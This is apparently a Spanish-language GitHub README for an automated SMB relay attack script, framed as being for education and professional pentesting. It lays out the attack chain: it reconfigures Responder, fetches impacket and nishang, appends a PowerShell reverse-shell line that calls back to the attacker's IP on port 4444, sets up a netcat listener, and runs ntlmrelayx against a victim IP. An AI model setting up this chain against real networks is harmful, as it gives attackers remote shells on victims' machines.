
# SambaRelay

Canal de youtube  https://youtube.com/c/Anonimo501

Grupo en Telegram https://t.me/Pen7esting

## Samba Relay

## Vaya a la ultima version aqui: https://github.com/Anonimo501/SMBRelay

Este script es creado para fines educativos o para hacer auditorias profesionales de pentesting a nivel empresarial, no me hago responsable del mal uso de dicho  script, este script automatiza la modificacion del archivo Responder.conf en los valores SMB = Off y HTTP = Off, locual lo deja a la escucha, tambien descarga automaticamente https://github.com/SecureAuthCorp/impacket y descarga https://github.com/samratashok/nishang en nishang ingresa a nishang/Shells/ copia el archivo y lo renombra cp Invoke-PowerShellTcp.ps1 PS.ps1, al archivo PS.ps1 se le añade una linea al final que es la siguiente  Invoke-PowerShellTcp -Reverse -IPAddress $hacker -Port 4444, se deja a la escucha un server http automaticamente con el siguiente comando python -m SimpleHTTPServer, dejamos nc a la escucha rlwrap nc -nlvp 4444, no es necesario instalar los requerimientos de impacket o nishang ya que el script lo hace automaticamente, tambien crea un archivo llamado targets.txt dentro de /impacket/examples el cual contiene la  ip victima y por ultimo se ejecutal ntlmrelayx.py para lograr el acceso.

Esta Version del script basicamente lo que se le añade es el menu de opciones que nos permite la ejecucion del script nuevamente sin tener que reinstalar todo desde cer0

El script se ejecuto sobre ParrotOS 4.10

## Version del Script
Version 2

![Captura](https://user-images.githubusercontent.com/67207446/120703323-c3810980-c47a-11eb-93d6-3a19caa26600.PNG)


## Uso

git clone https://github.com/Anonimo501/SambaRelay_V2.git

cd SambaRelay_V2/

chmod +x SMB_Relay_v2.sh

./SMB_Relay.sh


# Referencias

SecureAuth Corporation.https://github.com/SecureAuthCorp/impacket
SamratAshok.https://github.com/samratashok/nishang
